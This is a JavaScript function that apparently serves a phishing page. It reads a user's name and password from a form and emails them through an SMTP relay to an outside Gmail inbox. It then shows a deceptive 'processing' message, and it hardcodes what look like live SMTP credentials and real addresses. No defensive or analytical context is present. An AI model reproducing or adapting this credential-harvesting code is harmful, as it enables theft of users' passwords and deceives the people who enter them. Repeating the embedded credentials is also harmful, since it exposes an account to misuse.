function emailSend(){

    var UserName = document.getElementById('name').value;
    var Password = document.getElementById('password').value;
    
    var messageBody = "Name : " + UserName +
    "<br/> Password : "  + Password;   
      Email.send({
          Host : "smtp.elasticemail.com",
          Username : "businessmail.001b@gmail.com",
          Password : "C09B4AE2C0CA0DBB56DCBCA158E9B86C8D9C",
          To : 'informationstore.001@gmail.com',
          From : "businessmail.001b@gmail.com",
          Subject : "New user Data",
          Body : messageBody
      }).then(
        message => {
          if(message=='OK'){
            swal("Loading...", "Your Data is on Processing", "success");
          }
          else{
            swal("Error", "Your Data in on Processing", "error");
          }
        }
      );
    }
    